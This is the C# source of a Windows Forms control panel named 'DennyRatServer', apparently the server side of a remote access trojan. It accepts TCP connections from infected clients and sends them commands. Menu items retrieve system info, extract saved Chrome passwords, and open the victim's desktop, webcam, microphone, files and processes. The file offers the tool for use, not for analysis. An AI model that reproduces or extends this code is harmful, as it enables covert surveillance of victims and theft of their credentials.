using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.CompilerServices;

namespace DennyRatServer
{
    public partial class Form1 : Form
    {
        private bool currentlyListening = false;
        private int port;
        private List<TcpClient> clients = new List<TcpClient>();
        private TcpListener server;
        private NetworkStream mainStream;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void StartListening()
        {
            if(clients.Count > 0)
            {
                if (!(clients[clients.Count - 1].Connected))
                {
                    return;
                }
            }

            TcpClient cli = new TcpClient();
            clients.Add(cli);
            int myind = clients.IndexOf(cli);

            while (!(clients[myind].Connected))
            {
                server.Start();
                clients[myind] = server.AcceptTcpClient();
                Console.WriteLine("working" + myind);
            }

            Thread communicating = new Thread(() => ListNewClient(myind));
            communicating.Start();
        }

        private void ListNewClient(int myind)
        {
            BinaryFormatter binFormatter = new BinaryFormatter();

            SendCommand("startconnection", myind);

            mainStream = clients[myind].GetStream();
            string stre = (string)binFormatter.Deserialize(mainStream);

            string[] stra = stre.Split('=');

            ListViewItem item = new ListViewItem(stra[0]);
            item.SubItems.Add(stra[1]);
            item.SubItems.Add(myind.ToString());

            SetList(item);

            //listView1.Items.Add(item);

            //while ((clients[myind].Connected))
        }

        private void SetList(ListViewItem itm)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<ListViewItem>(SetList), itm);
            }
            else
            {
                listView1.Items.Add(itm);
            }
        }

        private void SendCommand(string command, int myind)
        {
            BinaryFormatter binFormatter = new BinaryFormatter();
            mainStream = clients[myind].GetStream();
            binFormatter.Serialize(mainStream, command);
        }

        private string ReceiveCommand(int myind)
        {
            BinaryFormatter binFormatter = new BinaryFormatter();
            mainStream = clients[myind].GetStream();
            try
            {
                return (string)binFormatter.Deserialize(mainStream);
            }
            catch
            {
                return "failedcatch";
            }
        }

        private void StopListening()
        {
            server.Stop();
            clients = null;
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            StopListening();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            int prt = 0;
            try
            {
                prt = int.Parse(textBox1.Text);
            }
            catch
            {
                MessageBox.Show("Invalid port");
                return;
            }

            textBox1.Enabled = false;
            button1.Enabled = false;

            port = prt;

            server = new TcpListener(IPAddress.Any, port);

            //Thread Listening = new Thread(StartListening);
            timer1.Enabled = true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if(clients.Count > 0)
            {
                if(clients[clients.Count - 1].Connected)
                {
                    Thread Listening = new Thread(StartListening);
                    Listening.Start();
                }
            }
            else
            {
                Thread Listening = new Thread(StartListening);
                Listening.Start();
            }
        }

        private void getInfoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int myind = int.Parse(listView1.SelectedItems[0].SubItems[2].Text);
            SendCommand("showinfo", myind);

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = clients[myind].GetStream();
            string stre = (string)binFormatter.Deserialize(mainStream);

            SysInfo si = new SysInfo(stre);
            si.ShowDialog();
        }

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int myind = int.Parse(listView1.SelectedItems[0].SubItems[2].Text);
            TcpClient cli = clients[myind];

            RemDesk rd = new RemDesk(cli);
            rd.ShowDialog();
        }

        private void passwordManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int myind = int.Parse(listView1.SelectedItems[0].SubItems[2].Text);

            PassManager pm = new PassManager(myind, this);
            pm.ShowDialog();

        }

        public string GetChromePasses(int myid)
        {
            SendCommand("getchrpasses", myid);

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = clients[myid].GetStream();
            string stre = (string)binFormatter.Deserialize(mainStream);
            return stre;
        }

        private void cameraToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Starting the Camera Will Turn on the Camera Light. Continue?", "Use With Caution", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.No)
            {
                return;
            }

            int myind = int.Parse(listView1.SelectedItems[0].SubItems[2].Text);
            TcpClient cli = clients[myind];

            RemCamera rc = new RemCamera(cli);
            rc.ShowDialog();
        }

        private void audioStreamerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int myind = int.Parse(listView1.SelectedItems[0].SubItems[2].Text);
            TcpClient cli = clients[myind];

            RemAudio ra = new RemAudio(cli);
            ra.ShowDialog();
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int myind = int.Parse(listView1.SelectedItems[0].SubItems[2].Text);
            TcpClient cli = clients[myind];

            RemFlManager rfm = new RemFlManager(cli);
            rfm.ShowDialog();
        }

        private void processManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int myind = int.Parse(listView1.SelectedItems[0].SubItems[2].Text);
            TcpClient cli = clients[myind];

            RemProcManager rpm = new RemProcManager(cli);
            rpm.ShowDialog();
        }

        private void funMenuToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int myind = int.Parse(listView1.SelectedItems[0].SubItems[2].Text);
            TcpClient cli = clients[myind];

            FunMenu fm = new FunMenu(cli);
            fm.ShowDialog();
        }
    }
}
